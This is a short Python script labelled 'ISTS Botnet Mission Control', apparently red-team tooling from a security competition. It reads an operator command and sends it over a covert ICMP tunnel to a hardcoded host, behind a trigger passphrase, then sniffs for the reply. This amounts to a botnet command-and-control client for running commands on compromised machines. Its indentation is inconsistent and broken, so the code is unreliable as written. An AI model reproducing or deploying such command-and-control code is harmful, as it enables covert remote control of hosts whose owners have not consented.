from icmp_tunnel import *
import sys

def main():
	print(" - ISTS Botnet Mission Control - ")
    	print("\thelp - to list commands")
    	sys.stdout.write(">>>")
	cmd = raw_input("")
	send_icmp(localhost, "10.80.100.14", "OkayNowYouCanUseMe"+cmd)


#send_icmp(localhost, "10.80.100.14", "OkayNowYouCanUseMels")
	print(snif_icmp())
if __name__ == "__main__":
    main()
